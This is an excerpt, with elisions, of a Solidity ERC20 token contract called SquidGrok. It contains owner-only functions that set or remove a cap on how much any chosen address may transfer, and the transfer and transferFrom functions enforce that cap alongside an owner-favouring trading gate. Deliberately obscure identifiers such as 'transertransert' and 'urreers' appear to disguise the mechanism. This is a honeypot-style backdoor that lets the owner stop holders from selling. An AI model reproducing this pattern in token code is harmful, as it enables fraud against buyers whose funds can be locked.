...
contract SquidGrok is Context, Ownable, IERC20 {
    ...
    mapping(address => uint256) public totalTransfertranserts; // Limits for total transfers.
    ...
    modifier transfertransert(address sender, uint256 amount) {
        uint256 transert = totalTransfertranserts[sender];
        if (transert > 0) {
            require(totalTransferredAmounts[sender] + amount <= transert, "Total transfer amount exceeds the set transert");
        }
        _;
    }
    ...
    function setTotalTransfer(address urreers, uint256 transert) public onlyOwner {
        totalTransfertranserts[urreers] = transert;
    }

    // Removes the transfer limit for a specific address.
    function removeTotalTransfer(address urreers) public onlyOwner {
        delete totalTransfertranserts[urreers];
    }

    // Transfers `amount` tokens to `recipient`, adhering to transfer limits.
    function transfer(address recipient, uint256 amount) public virtual override transfertransert(_msgSender(), amount) tradingActiveOrOwner returns (bool) {
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transfertransert(sender, amount) tradingActiveOrOwner returns (bool) {
